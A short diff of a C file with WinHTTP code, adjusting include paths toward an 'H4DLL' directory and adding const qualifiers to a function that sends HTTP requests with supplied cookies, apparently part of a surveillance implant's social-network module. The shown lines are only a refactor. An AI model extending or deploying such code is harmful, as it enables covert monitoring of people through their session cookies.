@@ -1,7 +1,9 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <winhttp.h>
-#include "..\common.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include "NetworkHandler.h"
 #include "SocialMain.h"
 
@@ -9,14 +11,14 @@ static HINTERNET g_http_social_session = NULL;
 
 // Invia una richiesta HTTP e legge la risposta
 // Alloca il buffer con la risposta (che va poi liberato dal chiamante)
-DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, DWORD port, BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, char *cookies)
+DWORD HttpSocialRequest(const WCHAR *Host, const WCHAR *verb, const WCHAR *resource, DWORD port, BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, char *cookies)
 {
 	WCHAR *cookies_w;
 	DWORD cookies_len;
 	DWORD dwStatusCode = 0;
 	DWORD dwTemp = sizeof(dwStatusCode);
 	DWORD n_read;
-	char *types[] = { "*\x0/\x0*\x0",0 };
+	const char *types[] = { "*\x0/\x0*\x0",0 };
 	HINTERNET hConnect, hRequest;
 	BYTE *ptr;
 	DWORD flags = 0;
@@ -110,7 +112,7 @@ DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, DWORD port, B
 }
 
 
-void SocialWinHttpSetup(WCHAR *DestURL)
+void SocialWinHttpSetup(const WCHAR *DestURL)
 {
 	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig;
 	WINHTTP_PROXY_INFO ProxyInfoTemp, ProxyInfo;
